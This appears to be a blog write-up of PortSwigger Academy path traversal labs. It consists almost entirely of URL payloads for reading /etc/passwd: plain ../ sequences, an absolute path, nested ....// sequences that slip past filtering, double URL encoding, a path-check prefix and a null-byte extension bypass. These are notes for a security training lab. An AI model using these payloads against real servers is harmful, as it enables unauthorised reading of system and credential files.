---
title: "Portswigger Academy Notes: Path Traversal"
date: 2021-04-15 15:00:00 -0800
categories: [CTF, writeup]
tags: [writeup]
toc: true
---

Goal: Read /etc/passwd

Lab Solutions

```
Lab1 - Basic:
/image?filename=../../../../../../../etc/passwd

Lab2 - Absolute Path:
/image?filename=/etc/passwd

Lab3 - Recursively removing ../:
/image?filename=....//....//....//etc/passwd

Lab4 - Wack URL Encoding:
..%252f..%252f..%252fetc%252fpasswd
[Resource for this one](https://security.stackexchange.com/questions/48879/why-does-directory-traversal-attack-c0af-work).

Lab4 - Path Verification:
/image?filename=/var/www/images/../../../etc/passwd

Lab5 - Null Byte:
/image?filename=/../../../etc/passwd%00.png
```